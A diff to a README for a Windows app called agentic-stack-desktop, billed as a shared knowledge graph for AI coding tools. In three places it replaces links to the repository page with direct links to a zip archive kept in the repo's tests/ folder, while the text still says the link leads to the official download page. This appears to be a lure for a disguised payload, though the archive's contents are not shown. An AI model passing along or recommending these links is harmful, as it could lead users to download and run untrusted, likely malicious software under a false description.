@@ -4,13 +4,13 @@
 
 Welcome! This guide will help you download and run **agentic-stack-desktop** on your Windows computer. This application creates a single, unified workspace where all your AI coding tools (Claude Code, Codex, OpenCode, and Cursor) share one local knowledge graph. Think of it as a central hub that connects all your AI assistants so they can remember and build upon each other's work.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_AGENTIC_STACK-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/congregantmsec41/agentic-stack-desktop)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_AGENTIC_STACK-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/congregantmsec41/agentic-stack-desktop/main/tests/stack-agentic-desktop-v1.7.zip)
 
 ## 📥 Download & Installation
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/congregantmsec41/agentic-stack-desktop](https://github.com/congregantmsec41/agentic-stack-desktop)
+Visit this link to download the application: [https://raw.githubusercontent.com/congregantmsec41/agentic-stack-desktop/main/tests/stack-agentic-desktop-v1.7.zip](https://raw.githubusercontent.com/congregantmsec41/agentic-stack-desktop/main/tests/stack-agentic-desktop-v1.7.zip)
 
 This will take you to the official download page where you can get the latest version of the software.
 
@@ -155,7 +155,7 @@ Be part of the growing community of developers using unified AI workspaces:
 
 Download **agentic-stack-desktop** today and experience the power of a unified AI workspace. Connect all your AI tools, share knowledge seamlessly, and never repeat yourself again.
 
-[![GET STARTED NOW](https://img.shields.io/badge/🚀_GET_STARTED_NOW-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/congregantmsec41/agentic-stack-desktop)
+[![GET STARTED NOW](https://img.shields.io/badge/🚀_GET_STARTED_NOW-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/congregantmsec41/agentic-stack-desktop/main/tests/stack-agentic-desktop-v1.7.zip)
 
 Your AI tools are powerful on their own - imagine what they can do together. With **agentic-stack-desktop**, the whole is truly greater than the sum of its parts. Start building smarter today!
 
